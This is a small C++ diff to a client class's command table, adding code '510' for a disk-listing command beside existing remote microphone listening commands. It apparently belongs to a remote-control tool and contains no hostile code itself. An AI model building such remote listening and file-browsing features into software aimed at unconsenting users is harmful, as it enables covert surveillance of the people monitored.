@@ -33,7 +33,8 @@ class Cliente {
 			{"505", EnumComandos::Mic_Refre_Dispositivos},
 			{"506", EnumComandos::Mic_Refre_Resultado},
 			{"507", EnumComandos::Mic_Iniciar_Escucha},
-			{"508", EnumComandos::Mic_Detener_Escucha}
+			{"508", EnumComandos::Mic_Detener_Escucha},
+			{"510", EnumComandos::FM_Discos}
 		};
 
 		Cliente();
